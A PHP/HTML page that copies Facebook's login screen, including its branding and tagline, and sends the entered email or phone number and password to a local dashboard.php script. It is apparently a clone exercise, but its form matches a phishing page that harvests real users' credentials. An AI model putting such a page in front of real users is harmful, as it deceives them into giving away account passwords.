<?php

if (isset($_GET['status']) && $_GET['status'] == "false") {
    echo "<script> alert('User and Pass Incorrect') </script>";
}


?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Login/Create Account</title>
    <link rel="icon" href="https://tse1.mm.bing.net/th/id/OIP.d9GZxbX8Gi9_qGg7XP1ntgHaHa?pid=Api">
    <link rel="stylesheet" href="facebook.css">
</head>



<body class="stick">
    <div class="design">
        <h1 class="colorfont">facebook</h1>
        <p class="colorfont2">Connect with friends and the world <br> around you on facebook</p>
    </div>
    <div class="stick2">
        <form action="functions/dashboard.php" method="POST">
            <input type="text" id="user_name" class="type1" name="user_name" placeholder="Email or phone number"><br><br>
            <input type="Password" id="password" class="type2" name="password" placeholder="Password"><br><br>
            <button class="click" type="submit">Log in</button>
            <p class="type3">Forgot password?</p>
            <p class="BOTBOT">Create a Page
            <p class="BOTBOT1">for a celebrity, brand or business.</p>
            <a href="createPage.php" class="click1">Create new account</a>      
        </form>


</body>

</html>